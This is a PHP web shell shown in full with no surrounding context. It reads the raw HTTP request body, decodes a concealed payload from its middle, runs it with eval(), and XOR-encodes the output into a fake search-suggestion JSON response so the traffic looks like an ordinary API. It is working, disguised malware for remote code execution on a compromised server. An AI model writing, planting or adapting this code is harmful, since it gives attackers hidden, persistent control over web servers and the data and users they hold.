<?php
@ini_set("display_errors", "0");
@set_time_limit(0);
function aes_decrypt($data, $key) {
    $iv = substr($data, 0, 16);
    $cipherText = substr($data, 16);
    $decrypted = openssl_decrypt($cipherText, 'aes-128-cfb', $key, OPENSSL_RAW_DATA, $iv);
    return $decrypted;
}
function hex2bin_custom($hexString) {
    $binData = '';
    for ($i = 0; $i < strlen($hexString); $i += 2) {

        $binData .= chr(hexdec(substr($hexString, $i, 2)));
    }
    return $binData;
}
function xor_with_key($data, $key) {
    $output = '';
    $keyLength = strlen($key);
    $dataLength = strlen($data);
    for ($i = 0; $i < $dataLength; $i++) {
        $output .= $data[$i] ^ $key[$i % $keyLength];
    }
    return $output;
}

$aeskey = base64_decode("lY4XTVY+PNCMoFwxjHsWQi0jW0oNqfScVIUk/KE6a3M=");
$requestBody = file_get_contents("php://input");
$middlePart = substr($requestBody, 110, strlen($requestBody) -114);
$base64Decoded = base64_decode($middlePart);
$hexDecoded = hex2bin_custom(bin2hex($base64Decoded));
$code=hex2bin_custom($hexDecoded);
ob_start();
eval($code);
$output = ob_get_clean();
$xorResult = xor_with_key($output, base64_decode("UXwoRqMyaRkUxjvKifu2rw=="));
$res = base64_encode($xorResult);
echo '{"code":0,"data":{"suggestItems":[],"global":"e1JTQX0pZ'.$res.'","exData":{"api_flow01":"0","api_flow02":"0","api_flow03":"1","api_flow04":"0","api_flow05":"0","api_flow06":"0","api_flow07":"0","api_tag":"2","local_cityid":"-1"}}}';
?>
